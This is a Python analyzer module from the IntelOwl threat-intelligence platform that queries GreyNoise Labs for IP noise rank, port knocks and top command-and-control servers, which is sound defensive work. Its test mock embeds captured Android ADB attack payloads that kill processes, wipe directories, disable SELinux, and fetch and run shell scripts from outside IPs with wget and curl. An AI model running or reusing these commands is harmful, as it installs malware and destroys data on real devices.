# This file is a part of IntelOwl https://github.com/intelowlproject/IntelOwl
# See the file 'LICENSE' for copying permission.

import logging
import os

import requests
from django.conf import settings

from api_app.analyzers_manager.classes import ObservableAnalyzer
from api_app.analyzers_manager.exceptions import AnalyzerRunException
from api_app.models import PluginConfig
from tests.mock_utils import MockUpResponse, if_mock_connections, patch

logger = logging.getLogger(__name__)

url = "https://api.labs.greynoise.io/1/query"
db_name = "topc2s_ips.txt"
db_location = f"{settings.MEDIA_ROOT}/{db_name}"

queries = {
    "noiserank": {
        "query_string": "query NoiseRank($ip: String) { noiseRank(ip: $ip) \
            { queryInfo { resultsAvailable resultsLimit } ips { ip noise_score \
            sensor_pervasiveness country_pervasiveness payload_diversity \
            port_diversity request_rate } } }",
        "ip_required": True,
    },
    "topknocks": {
        "query_string": "query TopKnocks($ip: String) { topKnocks(ip: $ip) \
            { queryInfo { resultsAvailable resultsLimit } knock { last_crawled \
            last_seen source_ip knock_port title favicon_mmh3_32 \
            favicon_mmh3_128 jarm ips emails links tor_exit headers apps } } } ",
        "ip_required": True,
    },
    "topc2s": {
        "query_string": "query TopC2s { topC2s { queryInfo \
            { resultsAvailable resultsLimit } c2s { source_ip c2_ips \
            c2_domains payload hits pervasiveness } } } ",
        "ip_required": False,
        "db_location": db_location,
    },
}


class GreynoiseLabs(ObservableAnalyzer):
    _auth_token: str

    def run(self):
        result = {}
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {self._auth_token}",
        }

        try:
            for key, value in queries.items():
                if not value["ip_required"]:
                    if not os.path.isfile(value["db_location"]) and not self.update():
                        logger.error(f"Failed extraction from {key} db")
                    if not os.path.exists(value["db_location"]):
                        raise AnalyzerRunException(
                            f"database location {value['db_location']} does not exist"
                        )

                    with open(value["db_location"], "r", encoding="utf-8") as f:
                        db = f.read()

                    db_list = db.split("\n")
                    if self.observable_name in db_list:
                        result[key] = {"found": True}
                    else:
                        result[key] = {"found": False}
                    continue

                json_body = {
                    "query": value["query_string"],
                    "variables": {"ip": f"{self.observable_name}"},
                }
                response = requests.post(headers=headers, json=json_body, url=url)
                response.raise_for_status()
                result[key] = response.json()
        except requests.RequestException as e:
            raise AnalyzerRunException(e)

        return result

    @classmethod
    def _get_auth_token(cls):
        for plugin in PluginConfig.objects.filter(
            parameter__python_module=cls.python_module,
            parameter__is_secret=True,
            parameter__name="auth_token",
        ):
            if plugin.value:
                return plugin.value
        return None

    @classmethod
    def _update_db(cls, auth_token: str):
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {auth_token}",
        }

        try:
            logger.info("Fetching data from greynoise API (Greynoise_Labs).....")
            response = requests.post(
                headers=headers,
                json={"query": queries["topc2s"]["query_string"]},
                url=url,
            )
            response.raise_for_status()
            topc2s_data = response.json()

            with open(db_location, "w", encoding="utf-8") as f:
                for value in topc2s_data["data"]["topC2s"]["c2s"]:
                    ip = value["source_ip"]
                    if ip:
                        f.write(f"{ip}\n")

            if not os.path.exists(db_location):
                return False

            logger.info("Data fetched from greynoise API (Greynoise_Labs).....")
            return True
        except Exception as e:
            logger.exception(e)

    @classmethod
    def update(cls):
        auth_token = cls._get_auth_token()
        if auth_token:
            return cls._update_db(auth_token=auth_token)
        return False

    @classmethod
    def _monkeypatch(cls):
        patches = [
            if_mock_connections(
                patch(
                    "requests.post",
                    return_value=MockUpResponse(
                        [
                            {
                                "data": {
                                    "noiseRank": {
                                        "queryInfo": {
                                            "resultsAvailable": 1,
                                            "resultsLimit": 1,
                                        },
                                        "ips": [
                                            {
                                                "ip": "20.235.249.22",
                                                "noise_score": 12,
                                                "sensor_pervasiveness": "very low",
                                                "country_pervasiveness": "low",
                                                "payload_diversity": "very low",
                                                "port_diversity": "very low",
                                                "request_rate": "low",
                                            }
                                        ],
                                    }
                                }
                            },
                            {
                                "data": {
                                    "topKnocks": {
                                        "queryInfo": {
                                            "resultsAvailable": 1,
                                            "resultsLimit": 1,
                                        },
                                        "knock": [
                                            {
                                                "last_crawled": "2024-03-15T00:02:16Z",
                                                "last_seen": "2024-03-14T11:04:48Z",
                                                "source_ip": "47.94.88.172",
                                                "knock_port": 8080,
                                                "title": "龙软GIS-云平台",
                                                "favicon_mmh3_32": 653143204,
                                                "favicon_mmh3_128": "ssb6\
                                                    UdtubRsCm46R63DxuQ==",
                                                "jarm": "000000000000000000000000000\
                                                00000000000000000000000000000000000",
                                                "ips": [],
                                                "emails": [],
                                                "links": [],
                                                "tor_exit": False,
                                                "headers": '{"Connection":\
                                                ["keep-alive"],"Content-Type"\
            :["text/html"],"Date":["Fri, 15 Mar 2024 00:02:16 GMT"],\
            "Etag":["W/\\"65e6ef29-1d15\\""],"Last-Modified":["Tue, \
            05 Mar 2024 10:08:41 GMT"],"Server":["nginx/1.21.5"],"Vary"\
                :["Accept-Encoding","Accept-Encoding"]}',
                                                "apps": '[{"app_name"\
                                                    :"Nginx","version":"1.21.5"}]',
                                            }
                                        ],
                                    }
                                }
                            },
                            {
                                "data": {
                                    "topC2s": {
                                        "queryInfo": {
                                            "resultsAvailable": 1914,
                                            "resultsLimit": 191,
                                        },
                                        "c2s": [
                                            {
                                                "source_ip": "91.92.247.12",
                                                "c2_ips": ["103.245.236.120"],
                                                "c2_domains": [],
                                                "payload": "CNXN\u0000\u0000\u0000\
                                                    \u0001\u0000\u0000\u0004\u0000\u001b\
            \u0000\u0000\u0000M\n\u0000\u0000����host::features=cmd,shell_v2OPENX\
            \u0001\u0000\u0000\u0000\u0000\u0000\u0000}\u0003\u0000\u0000�\u001d\
            \u0001\u0000����shell:su 0 kill -9 $(su 0 toybox ps -eo pid,%cpu,cmd \
            --sort=-%cpu | awk 'NR>1 && $3 !~ /^(sh|surfaceflinger|system_server)/ \
            && $2 > 15 && $1 != '$$' {print $1}');toybox pkill -9 M;toybox pkill \
            -9 arm;toybox pkill -9 arm7;toybox pkill -9 x86;toybox pkill -9 \
            x86_64;su 0 toybox pkill -9 arm;su 0 toybox pkill -9 arm7;su 0 \
            toybox pkill -9 x86;su 0 toybox pkill -9 x86_64;su 0 rm -rf \
            /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 \
            chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 \
            /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd \
            /data/local/most; rm -rf *;setenforce 0;busybox wget \
            http://103.245.236.120/and || su 0 busybox wget \
            http://103.245.236.120/and;chmod 777 and || su 0 chmod 777 and;sh \
            and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 \
            /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 \
            /data/local;ulimit 999999\u0000",
                                                "hits": 11608,
                                                "pervasiveness": 94,
                                            },
                                            {
                                                "source_ip": "14.225.208.190",
                                                "c2_ips": ["14.225.213.142"],
                                                "c2_domains": [],
                                                "payload": "CNXN\
            \u0000\u0000\u0000\u0001\u0000\u0000\u0004\u0000\
          \u001b\u0000\u0000\u0000M\n\u0000\u0000����host::features=cmd,shell_v2OPENX\
          \u0001\u0000\u0000\u0000\u0000\u0000\u0000F\u0001\u0000\u0000�b\u0000\u0000\
          ����shell:cd /data/local/tmp/; busybox wget http://14.225.213.142/w.sh; \
          sh w.sh; curl http://14.225.213.142/c.sh; sh c.sh; wget \
            http://14.225.213.142/wget.sh; sh wget.sh; curl \
                http://14.225.213.142/wget.sh; sh wget.sh; busybox wget \
                    http://14.225.213.142/wget.sh; sh wget.sh; busybox curl \
                        http://14.225.213.142/wget.sh; sh wget.sh\u0000",
                                                "hits": 2091,
                                                "pervasiveness": 26,
                                            },
                                            {
                                                "source_ip": "157.10.53.101",
                                                "c2_ips": ["14.225.208.190"],
                                                "c2_domains": [],
                                                "payload": "CNXN\
            \u0000\u0000\u0000\u0001\u0000\u0000\u0004\u0000\
            \u001b\u0000\u0000\u0000M\n\u0000\u0000����host::features=cmd,\
            shell_v2OPENX\u0001\u0000\u0000\u0000\u0000\u0000\u0000�\u0002\
            \u0000\u0000��\u0000\u0000����shell:cd /data/local/tmp/;rm \
            -rf *;rm -rf *huhu*;rm -rf *hbt*;rm -rf *skyljne*;rm -rf *skyljnee*;rm \
            -rf *sh* ; rm -rf *arm* ; rm -rf *ppc* ; rm -rf *x86* ; rm -rf *mips* \
            ;rm -rf *mpsl* ; rm -rf *spc* ; rm -rf *m68k* ; busybox wget \
            http://14.225.208.190/adb1.sh; sh adb1.sh; wget \
            http://14.225.208.190/adb1.sh; sh adb1.sh; curl \
            http://14.225.208.190/adb1.sh; sh adb1.sh; busybox wget \
            http://14.225.208.190/adb2.sh; sh adb2.sh; wget \
            http://14.225.208.190/adb2.sh; sh adb2.sh; curl \
            http://14.225.208.190/adb2.sh; sh adb2.sh; busybox wget \
            http://14.225.208.190/adb3.sh; sh adb3.sh; wget \
            http://14.225.208.190/adb3.sh; sh adb3.sh; curl \
            http://14.225.208.190/adb3.sh; sh adb3.sh\u0000",
                                                "hits": 1193,
                                                "pervasiveness": 23,
                                            },
                                        ],
                                    },
                                },
                            },
                        ],
                        200,
                    ),
                )
            )
        ]
        return super()._monkeypatch(patches=patches)
